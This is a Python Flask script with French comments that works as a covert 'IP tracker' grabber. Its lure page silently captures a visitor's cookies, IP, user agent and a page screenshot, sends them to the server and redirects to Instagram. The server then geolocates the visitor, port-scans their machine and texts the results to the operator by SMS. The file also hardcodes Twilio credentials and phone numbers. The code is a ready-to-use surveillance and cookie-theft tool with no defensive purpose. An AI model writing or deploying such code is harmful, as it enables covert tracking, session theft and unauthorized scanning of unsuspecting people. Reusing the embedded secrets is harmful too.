from flask import Flask, request, jsonify, redirect
from twilio.rest import Client
import requests
import socket

app = Flask(__name__)

# Twilio credentials
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
from_number = '+12524866318'  # Numéro Twilio
to_number = '+33635960569'    # Ton numéro vérifié

client = Client(account_sid, auth_token)

# Géolocalisation IP
def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return f"{res['city']}, {res['regionName']}, {res['country']} (ISP: {res['isp']})"
    except:
        return "Localisation impossible"

# Scan rapide des ports communs (optionnel)
def scan_ports(ip):
    try:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3389]
        open_ports = []
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        return open_ports
    except:
        return []

# Envoi du SMS
def send_sms(ip, user_agent, cookies, screenshot):
    location = get_geolocation(ip)
    ports = scan_ports(ip)
    
    message_body = (
        f"[IP TRACKER]\n"
        f"IP : {ip}\n"
        f"User-Agent : {user_agent}\n"
        f"Cookies : {cookies[:50]}...\n"
        f"Screenshot (début) : {screenshot[:50]}...\n"
        f"Localisation : {location}\n"
        f"Ports ouverts : {ports if ports else 'Aucun'}"
    )

    print("[+] Envoi SMS avec message :")
    print(message_body)

    try:
        message = client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )
        print(f"[+] SMS envoyé ! SID : {message.sid}")
    except Exception as e:
        print(f"[!] Erreur Twilio : {e}")

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Tracking</title></head>
    <body>
        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
        <script>
            const cookies = document.cookie;

            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                html2canvas(document.body).then(canvas => {
                    const screenshot = canvas.toDataURL();

                    document.body.addEventListener('click', function(event) {
                        fetch("/log", {
                            method: "POST",
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                ip: data.ip,
                                ua: navigator.userAgent,
                                cookies: cookies,
                                screenshot: screenshot
                            })
                        });
                        window.location.href = "https://instagram.com"; // Redirection
                    });
                });
            });
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('ua')
    cookies = data.get('cookies')
    screenshot = data.get('screenshot')

    send_sms(ip, user_agent, cookies, screenshot)

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
